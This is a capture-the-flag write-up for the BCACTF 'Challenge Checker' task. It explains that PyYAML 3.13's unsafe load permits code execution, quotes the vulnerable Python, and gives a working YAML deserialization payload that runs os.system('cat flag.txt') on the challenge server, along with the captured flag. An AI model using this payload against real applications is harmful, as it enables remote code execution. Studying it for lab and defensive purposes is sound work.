# Challenge Checker

#### Category : misc
#### Points : 150 points (70 solves)
#### Author : anli, Edward Feng

## Challenge
I made this challenge checker to automate away ed's job. Maybe you can get a flag if you give it enough delicious yams...

-   [chall.yaml](https://objects.bcactf.com/bcactf2/challenge-checker/chall.yaml)
-   [requirements.txt](https://objects.bcactf.com/bcactf2/challenge-checker/requirements.txt)
-   [verify.py](https://objects.bcactf.com/bcactf2/challenge-checker/verify.py)
-   `nc misc.bcactf.com 49153`

## Solution
Taking a look at `requirements.txt`, we find that it is using an old version of PyYAML(3.13).

When I searched for vulnerabilites, I found that PyYAML below 5.4 is vulnerable to arbitrary code execution due to the `full_load` method.

More Information :
[PyYAML Vulnerabilities](https://snyk.io/vuln/SNYK-PYTHON-PYYAML-590151)

I also found a writeup for the same at https://hackmd.io/@harrier/uiuctf20

#### Vulnerable Code :
The vulnerable function is the `check` function
```python
def check(raw_data) -> "Tuple[list[str], list[str]]":
    data = load(raw_data)
    if not isinstance(data, dict):
        raise Exception("Data must be a dictionary")
```

This function is being called after accepting `raw_data` from the user :
```python
if __name__ == "__main__":
    cprint("Paste in your chall.yaml file, then send an EOF:", "cyan", attrs=["bold"])
    sys.stdout.flush()
    try:
        raw_data = sys.stdin.read()
        errors, warnings = check(raw_data)
```

#### Getting flag.txt
I came up with the following payload to extract `flag.txt` :
```bash
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "import os; os.system('cat flag.txt')"
 ```
 
 Getting the flag :
 ```bash
$ cat payload|  ncat misc.bcactf.com 49153                                         
 
Paste in your chall.yaml file, then send an EOF or two empty lines:
bcactf{3d_r3ally_l1k35s_his_yams_c00ked_j5fc9g}
Fatal error: Data must be a dictionary

```

flag : `bcactf{3d_r3ally_l1k35s_his_yams_c00ked_j5fc9g}`

#### Note
I used ncat instead of nc because there was some problem while sending EOF with nc.